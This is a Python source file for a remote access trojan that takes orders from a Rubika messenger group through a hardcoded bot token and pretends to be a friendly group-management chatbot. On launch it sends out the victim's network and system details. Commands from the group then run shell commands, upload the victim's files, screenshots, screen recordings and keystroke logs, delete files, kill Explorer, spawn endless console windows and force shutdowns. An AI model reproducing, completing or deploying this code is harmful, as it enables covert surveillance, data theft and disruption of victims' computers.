from arsein.Arsein import Robot_Rubika as rb
import subprocess as sb
from os import system as sys
import os
from time import sleep as sp
from pyautogui import hotkey  as key
from pyautogui import typewrite  as tp
import pyautogui as pg
import cv2 as c2
import numpy as np
from random import choice as ch


drive = []

odir = sb .getoutput("ipconfig/all")
info = sb.getoutput("systeminfo")
drives = sb.getoutput("fsutil fsinfo drives").split()

for i in drives[1:]:
    drive.append(i[0])

sys("cls")

auth = "mhhcevihhwjsmmaadpyglgvfvtpzxsky"
bot = rb(auth)
# rat = rp(auth)
answered = []
gid = 'g0DH4Kc0e4522602d715eee4f254c928'
guid = "g0DH4Kc0e4522602d715eee4f254c928"
Guid = "g0DH4Kc0e4522602d715eee4f254c928"
Link = "https://rubika.ir/joing/EDCDEJEG0ONCRUTIUYFEUEYJYQQQGBJZ"

root = rb(auth)
def log(time):
    time = int(time)
    from pynput import keyboard as ke
    from time import sleep as sp
    def on_release(key):
        keys = [" ","[backspace] ","[Enter] ","Alt Left ","Alt Right ","TAb ","SHIFT ","Ctrl Left ","Ctrl Right ","win key ","[ESC] "]
        print(key)
        if key ==ke.Key.space:
            key= " "
        elif key == ke.Key.backspace:
            key= "[backspace] "
        elif key == ke.Key.enter:
            key == "[Enter] "
        elif key == ke.Key.alt_l:
            key = "Alt Left "
        elif key == ke.Key.alt_gr:
            key = "Alt Right "
        elif key == ke.Key.tab:
            key = "TAb "
        elif key == ke.Key.shift:
            key = "SHIFT "
        elif key == ke.Key.ctrl_l:
            key = "Ctrl Left "
        elif key == ke.Key.ctrl_r:
            key = "Ctrl Right "
        elif key == ke.Key.cmd:
            key = "win key "
        elif key == ke.Key.esc:
            key = "[ESC] "
        if key in keys:
            file.write(str(key)+"\n")
        else:
            file.write(str(key)+ ' ')
    listener=ke.Listener(on_release=on_release)
    listener.start()

    while 1:
        i = 0
        file = open("log.txt","a")
        sp(time)
        file.close()
        listener.stop()
        break
def vdrec(time_sleep=int):
    op = c2.VideoWriter_fourcc(*'XVID')
    out = c2.VideoWriter('screen.avi', op, 20.0, (1366,768))
    while 1:
        pht = pg.screenshot()
        frame = np.array(pht)
        frame = c2.cvtColor(frame,c2.COLOR_BGR2RGB)
        out.write(frame)
        
    out.release()
            
def Stealr(Mode):
    if Mode == "1":
        key("win","r")
        tp("explorer")
        key("Enter")
        sp(3)
        key("Tab")
        key("Tab")
        key("Tab")
        key("Enter")
        tp("%Userprofile%\Desktop")
        key("Enter")
        sp(1)
        key("Tab")
        key("Tab")
        key("Tab")
        key("Tab")
        key("Tab")
        key("Tab")
        key("Enter")
        tp("cmd")
        key("Enter")
        sp(1)
        tp("color 4")
        key("Enter")
        tp("cls")
        key("Enter")
        tp("xcopy /s /r /i /y . M:\GUI_\DESKTOP")
        key("Enter")
        tp("exit")
        key("Enter")
        sp(2)
        key("win","r")
        tp("explorer")
        key("Enter")
        sp(3)
        key("Tab")
        key("Tab")
        key("Tab")
        key("Enter")
        tp("%Userprofile%\Video")
        key("Enter")
        sp(1)
        key("Tab")
        key("Tab")
        key("Tab")
        key("Tab")
        key("Tab")
        key("Tab")
        key("Enter")
        tp("cmd")
        key("Enter")
        sp(3)
        tp("xcopy /s/r/y/i . M:\GUI_\VIDEOS")
        key("Enter")
        tp("exit")
        sp(2)
        key("win","r")
        tp("explorer")
        key("Enter")
        sp(3)
        key("Tab")
        key("Tab")
        key("Tab")
        key("Enter")
        tp("%Userprofile%\Documents")
        key("Enter")
        sp(2)
        key("Tab")
        key("Tab")
        key("Tab")
        key("Tab")
        key("Tab")
        key("Enter")
        tp("cmd")
        key("Enter")
        sp(2)
        tp("xcopy /s/r/y/i . M:\GUI_\DOC")
        key("Enter")
        tp("exit")
        key("Enter")
        sp(3)
        key("win","r")
        tp("explorer")
        key("Enter")
        sp(3)
        key("Tab")
        key("Tab")
        key("Tab")
        key("Enter")
        tp("%Userprofile%\Pictures")
        key("Enter")
        sp(2)
        key("Tab")
        key("Tab")
        key("Tab")
        key("Tab")
        key("Tab")
        key("Enter")
        tp("cmd")
        key("Enter")
        sp(1)
        tp("xcopy /s/r/y/i . M:\GUI_\PIC")
        key("Enter")
        sp(2)
        tp("exit")
        key("Enter")
        sp(5)
        key("win","r")
        tp("cmd")
        key("Enter")
        sp(1)
        tp("taskkill /f /im explorer.exe")
        key("Enter")
        sp(2)
        tp("start explorer")
        key("Enter")
        sp(30)
        os.kill("cmd.exe")
def type_persian(matn):
    typa = []

    alfba = {'ض':'q','ص':'w','ث':'e','ق':'r','ف':'t','غ':'y','ع':'u','ه':'i','خ':'o','ح':'p','ج':'[','چ':']','ش':'a','س':'s','ی':'d','ب':'f','ل':'g','ا':'h','ت':'j','ن':'k','م':'l','ک':';','گ':"'",'ظ':'z','ط':'x','ز':'c','ر':'v','ذ':'b','ذ':'n','ئ':'m','و':',','پ':"\ ",'ژ':'C'}
    
    for a in matn:
        alf = alfba.get(a)
        alf = str(alf)
        typa.append(alf)
    tp(typa)
# def convs(time,list_keys):
#     time = int(time)
#     from pynput import keyboard as ke
#     from time import sleep as sp
#     def on_release(key):
#         keys = [" ","[backspace] ","[Enter] ","Alt Left ","Alt Right ","TAb ","SHIFT ","Ctrl Left ","Ctrl Right ","win key ","[ESC] "]
#         alpha =  {
#             'q':'ض','w':'ص','e':'ث','r':'ق','t':'ف','y':'غ','u':'ع','i':'ه','o':'خ','p':'ح','[':'ج',']':'چ','a':'ش','s':'س','d':'ی','f':'ب','g':'ل','h':'ا','j':'ت','k':'ن','l':'م',';':'ک',"'":'گ','z':'ظ','x':'ط','c':'ط','v':'ز','b':'ر','n':'ذ','m':'د',',':'ئ',"\ ":'پ'
#             }
#         if key ==ke.Key.space:
#             key= " "
#         elif key == ke.Key.backspace:
#             key= "[backspace] "
#         elif key == ke.Key.enter:
#             key == "[Enter] "
#         elif key == ke.Key.alt_l:
#             key = "Alt Left "
#         elif key == ke.Key.alt_gr:
#             key = "Alt Right "
#         elif key == ke.Key.tab:
#             key = "TAb "
#         elif key == ke.Key.shift:
#             key = "SHIFT "
#         elif key == ke.Key.ctrl_l:
#             key = "Ctrl Left "
#         elif key == ke.Key.ctrl_r:
#             key = "Ctrl Right "
#         elif key == ke.Key.cmd:
#             key = "win key "
#         elif key == ke.Key.esc:
#             key = "[ESC] "
#         if key in keys:
#             file.write(str(key)+"\n")
#         else:
#             file.write(str(key)+ ' ')
#         for s in alpha:
#             if key == s :
#                 sd = alpha.get(key)
#                 list_keys.append(key)
#     listener=ke.Listener(on_release=on_release)
#     listener.start()

#     while 1:
#         i = 0
#         file = open("log.txt","a")
#         sp(time)
#         file.close()
#         listener.stop()
#         break
def look(time_sleep,x,y):
    bot.sendMessage(gid,'Look Stoped !')
    while 1:
        pg.click(x=x,y=y)
def convs():
    try:
        Group_Guid=bot.joinGroup(Link)["data"]["group"]["group_guid"]
    except KeyError:
        print('NOT OK GROUP')
    while 1:
        try:
            try:
                min_id = bot.getGroupInfo(Group_Guid)["data"]["chat"]["last_message_id"]
            except KeyError:
                print('NOT OK GROUP')
            messages = bot.getMessages(Group_Guid,min_id)
            for msg in messages:
                if msg['type'] == 'Text' :
                        if msg.get('message_id') not in answered:
                            answered.append(msg.get("message_id"))
                            text = msg.get('text')
                            text = str(text)
                            if msg.get("text") == ("سلام"):
                                bot.sendMessage(Group_Guid,'سلام خوبی ')
                            if msg.get('text').startswith('مرسی'):
                                bot.sendMessage(Group_Guid,'😊ممنون خوبم ')
                            if msg.get('text') == ('rat-rubika.py'):
                                main()
                            if msg.get('text') == ('تو کی هستی '):
                                bot.sendMessage(Group_Guid,'من یه ربات مدیریت گروه هستم \n و سازنده من @mr_sinoce_1_3_6_7 هست.')
                            if msg.get('text').startswith('خوبی'):
                                bot.sendMessage(Group_Guid,'مرسی خوبم')
                                
                                
        except:
            pass
def startup(username,lists):
    import os
    from os import system as s
    folder_startup = ["C:/","Users/",username+'/',"AppData/","Roaming/","Microsoft/","Windows/","Start Menu/","Programs/","Startup/"]
    for i in folder_startup:
        os.chdir(i)
    output = sb.getoutput('dir')
    bot.sendMessage(gid,output)
def main() :
    fir = ['mshvnclg','askmbjfnt','smbjgnr','snchgle','xngwhv','sgcldh','snvhfmaig;','vnshpfmeuck','lghjdhj','ajdnfhd','sjvnfhw','alsvkfmdh','skmvhif','slckfhk','gcbagdh','sdbjlkr','dsbjrilt','dsbsklgr','slbjdfgs','sbhfbd','asjfhkjsd']
    lst = ['asd259','sbvgfksmg65429','snvhgrel45','savjler53','assadasjd','shjsvsas','sjvnhfuax','smvhfuwk']
    bios = ['@@Sinoce@@','##Sinoce##','$$Sinoce$$','!!Sinoce!!','~~Sinoce~~','%Sinoce%','^Sinoce^','**Sinoce**']
    users = ['asdhgfdkqw','xcvjsiehse','dashlknfkdhrgd','vxvjdjlef','xdvxkdljwjrfs']
    # Group_Guid=bot.joinGroup(Link)["data"]["group"]["group_guid"]
    Group_Guid = 'g0DH4Kc0e4522602d715eee4f254c928'
    print('ok')
    
    
    while 1:
            min_id = bot.getGroupInfo(Group_Guid)["data"]["chat"]["last_message_id"] 
            bot.sendMessage(Group_Guid," ⚜💲💠💲💠💲⚜__HACKER PC SINOCE ENABLE__⚜💲💠💲💠💲⚜ ") 
            print('OKKKKKKK')              
            messages = bot.getMessages(Group_Guid,min_id)
            for msg in messages:
                # bot.editUser(ch(fir),ch(lst),ch(bios))
                # bot.editusername(ch(users))
                if msg['type'] == 'Text' :
                        if msg.get('message_id') not in answered:
                            answered.append(msg.get("message_id"))
                            text = msg.get('text')
                            text = str(text)
                            if msg.get("text").startswith("ip"):
                                re = msg.get('text').replace('ip ','')
                                if re == 'sysinfo':
                                    bot.sendMessage(Group_Guid,'IP SYSTEM 💠 '+str(sb.getoutput('ipconfig/all'))+'SYSTEM INFO 💠 '+str(sb.getoutput('systeminfo')))
                                    print("IP & SYSTEM INFO SEND !!")
                                bot.sendMessage(Group_Guid,odir)
                                print("IP SEND !!")
                            if msg.get('text') == 'sysinfo':
                                bot.sendMessage(Group_Guid,"SYSTEM INFO 💥~¦|¦~💥 "+info)
                                print("SYSTEM INFO SEND !!")
                            if text  == 'cmd task':
                                Stealr("1")
                                sys("msg * Sinoce WATCH YOU !")
                            if text == 'dir_docx':
                                for i in drive:
                                        bot.sendMessage(Group_Guid,' 💥PLEASE WAIT ...')
                                        doc = sb.getoutput(f"dir /s /b {i}*.docx")
                                        bot.sendMessage(Group_Guid,doc)
                            if text == 'dir_pdf':
                                    for i in drive:
                                        bot.sendMessage(Group_Guid,' 💥PLEASE WAIT ...')
                                        pdf = sb.getoutput(f"dir /s /b {i}*.pdf")
                                        bot.sendMessage(Group_Guid,pdf)
                            if text == 'command':
                                bot.sendMessage(Group_Guid,"""fork = start virus mod \n k_expl = kill explorer \n sysinfo = systeminfo☣ \n windir = directory windows☣ \n notepad = start notepad☣ \n taskmgr = start task manager☣ \n drives = list drives☣ \n  \n cmd  = start cmd☣ \n dir_docx = dir all files docx☣ \n dir_pdf = dir all files pdf☣ \n portscan = send ports target \n tasklist shutdown = shutdown + time shutdown \n  forceoff = shutdown force \n tp = type for pc target \n k = press on key pc target \n ky = press to key for pc target \n key = press three key for pc target \n sys = enter command system target \n log + timefinish = key logger enable for time sleep wait key logger disable and send file logger for group and delete file logger from pc target 💥 """)
                            if text == 'tasklist':
                                s = sb.getoutput("tasklist")
                                bot.sendMessage(Group_Guid,str(s))
                            if text == 'windir':
                                w = str(sb.getoutput("%windir%"))
                                bot.sendMessage(Group_Guid,"WINDOWS DIRCTORY -->"+w)
                            if text == 'drives':
                                bot.sendMessage(Group_Guid,drive)
                            if msg.get("text").startswith == ('taskkill'):
                                app = str(msg.get('text').replace("taskkill",""))
                                proc = sys("taskkill /f /im "+str(app))
                            if text.startswith('notepad'):
                                key("win","r")
                                tp("notepad")
                                key("Enter")
                            if text.startswith('start'):
                                key('win','r') 
                                tp('cmd')
                                key('Enter')
                            if text == 'taskmgr':
                                key('win','r')
                                tp("taskmgr")
                                key('Enter')
                            if text.lower().startswith('tasklist'):
                                key('win','r')
                                tp('cmd')
                                key('Enter')
                                sp(1)
                                tp("tasklist")
                                key('Enter')
                                task = sb.getoutput("tasklist")
                                bot.sendMessage(Group_Guid,'TASKLIST -->> \n '+task)    
                            if text.lower() == 'portscan':
                                port = str(sb.getoutput("netstat"))
                                bot.sendMessage(Group_Guid,'PORT TARGET IS -->> ⚜ '+"\n"+port)
                            if text.lower() == 'bomb':
                                while 1:
                                    g = 'u0BHsA80217da229fda8c2d438ded485'
                                    bot.sendMessage(g," HELLO Sinoce is Waitch You 💥")    
                            if msg.get('text').startswith == '@':
                                last = msg.get('text').replace("@","")
                                u = str(last)
                                user = root.getUserInfoByIDE(u)
                                bot.sendMessage(Group_Guid,'USER ~💲~ '+user)
                            if msg.get('text').startswith == 'cmd ':
                                b = msg.get('text').replace('cmd ','')
                                key('win','r')
                                tp('cmd')
                                key('Enter')
                                tp(b)
                                key('enter')
                            if msg.get('text').startswith('shutdown '):
                                w = msg.get('text').replace('shutdown ','')
                                w = int(w)
                                bot.sendMessage(Group_Guid,f'PC TARGET IS TIME {w} SHUTDOWN')
                                sys(f'shutdown /s /t {w}')
                            if msg.get('text').startswith('forceoff'):
                                sys('shutdown -p')
                            if msg.get('text') == 'fuck':
                                key("win","r")
                                tp("notepad")
                                key("Enter")
                                sp(2)
                                tp("what fuck mother bech")
                            if msg.get('text') == 'fork':
                                while 1:
                                    key('win','r')
                                    tp('cmd')
                                    key('Enter')
                                    sp(0.5)
                                    tp('exit')
                                    key('enter')
                            if msg.get('text') == 'k_expl':
                                sys('taskkill /f /im explorer.exe')
                            if msg.get('text').startswith('run '):
                                j = text.replace('run ','')
                                key('win','r')
                                tp(j)
                                key('Enter')
                            if msg.get('text').startswith('tp '):
                                matn = text.replace('tp ','')
                                tp(matn)
                            if msg.get('text').startswith('k'):
                                a = text.replace('k','').split('-')
                                dafe = int(a[0])
                                kode = str(a[1])
                                for E in range(dafe):
                                    key(kode)
                            if msg.get('text').startswith('ky '):
                                dok = text.replace('ky ','').split('+')
                                key(dok[0],dok[1])
                            if msg.get('text').startswith('key '):
                                s = text.replace('key ','').split('=')
                                key(s[0],s[1],s[2])
                            if msg.get('text').startswith('sc'):
                                tedad = str(text.replace('sc','')).split('+')
                                an = int(tedad[0])
                                sec = int(tedad[1])
                                for te in range(an):
                                    pg.screenshot('Screen.jpg')
                                    bot.sendPhoto('g0CoPI705144506ef4cb561662c44dab','Screen.jpg')
                                    sys('del /a Screen.jpg')
                                    sp(sec)
                            if msg.get('text').startswith('scr'):
                                    pg.screenshot('isdone.jpg')
                                    bot.sendPhoto('g0CoPI705144506ef4cb561662c44dab','isdone.jpg')
                            if msg.get('text').startswith('sys '):
                                sy = text.replace('sys ','')
                                sye = str(sy)
                                symsg = sb.getoutput(sye)
                                bot.sendMessage(Group_Guid,str(symsg))
                                sys(sye)
                            if msg.get('text') == 'cd ..':
                                os.chdir('.')
                                pwd = os.getcwd()
                                bot.sendMessage(Group_Guid,pwd)
                            if msg.get('text').startswith('cd '):
                                se = text.replace('cd ','')
                                os.chdir(se)
                                pwd = os.getcwd()
                                bot.sendMessage(Group_Guid,pwd)
                            if msg.get('text') == ('pwd'):
                                bot.sendMessage(Group_Guid,str(os.getcwd()))
                            if msg.get('text').startswith('recv '):
                                sn = text.replace('recv ','').split('+')
                                rcv_filles = sn[1:]
                                for i in rcv_filles:
                                    bot.sendFile('g0CoPI705144506ef4cb561662c44dab',i,f'FILE TARGET {i}')
                            if msg.get('text').startswith('rcv '):
                                se = text.replace('rcv ','')
                                bot.sendFile('g0CoPI705144506ef4cb561662c44dab',se,f'FILE TARGET {se}')
                            if msg.get('text').startswith('rm '):
                                rm = text.resplace('rm ','')
                                sys('del /a '+rm)
                                bot.sendMessage(Group_Guid,"FILE REMOVED "+rm)
                            if msg.get('text').startswith('rmdir '):
                                rmd = text.replace('rmdir ','')
                                sys('rd '+rmd)
                                bot.sendMessage(Group_Guid,'DIRECTORY REMOVED '+rmd)
                            if msg.get('text').startswith('dow '):
                                chre = bot.getChatUser('u0DYTSC082050a6e37703538446f7e16')
                                print(chre)
                            if msg.get('text').startswith('vrec '):
                                tm = text.replace('vrec ','')
                                tm = int(tm)
                                bot.startVoiceChat(gid)
                                sp(tm)
                                bot.finishVoiceChat(gid)
                            if msg.get('text').startswith('log '):
                                ti = text.replace('log ','')
                                ai = int(ti)
                                bot.sendMessage(Group_Guid,'KEY LOGGER ENABLED \ /💥/ ','italic')
                                log(ai)
                                bot.sendFile(gid,'log.txt',' 💥\n FILE LOGGER \n 💥 ')
                                sys('del /a log.txt')
                                bot.sendMessage(Group_Guid,'KEY LOGGER DISBLED 💥 \n FILE LOGGER ID DELETED 💥')
                            if msg.get('text').startwith('chdir '):
                                chd = text.replace("chdir ",'')
                                os.chdir(chd)
                                bot.sendMessage(Group_Guid,'CHANGED DIR TO  '+chd)
                            if msg.get('text').startwith('vidrec '):
                                vrc = text.replace('vidrec ','')
                                vrc = int(vrc)
                                rc = vrc * 20
                                vdrec(rc)
                                bot.sendFile(gid,"screen.avi","RECORDED PC TARGET 💥 ")
                                sys('del /a screen.avi')
                            if msg.get('text').startswith('voirec '):
                                voi = text.replace('voirec ','')
                                svoi = int(voi)
                                bot.startVoiceChat(gid)
                                sp(svoi)
                                bot.finishVoiceChat(gid)
                            if msg.get('text').startswith('start '):
                                fle = text.replace('start ','')
                                sys('start '+fle)
                            if msg.get('text') == ('dir'):
                                dirs = sb.getoutput('dir')
                                bot.sendMessage(Group_Guid,dirs)
                            if msg.get('text') == ('convs'):
                                convs()
                            if msg.get('text').startswith('clk '):
                                sleep_time_look = text.replace('clk ','').split('+')
                                x = int(sleep_time_look[1])
                                y = int(sleep_time_look[2])
                                sltime = int(sleep_time_look[0])
                                look(time_sleep=sltime,x=x,y=y)
                            if msg.get('text').startswith('strup '):
                                sas = text.replace('strup ','')
                                user = sas
                                setr = []
                                startup(user,setr)
                                bot.sendMessage(Group_Guid,'APPS STARTUP >--> '+setr)
                            # if msg.get('text').startswith('conver '):
                            #     conv = text.replace('conver ','')
                            #     key_list = []
                            #     time_sleep = int(conv)
                            #     convs(time_sleep,key_list)
                        
           
                            
main()
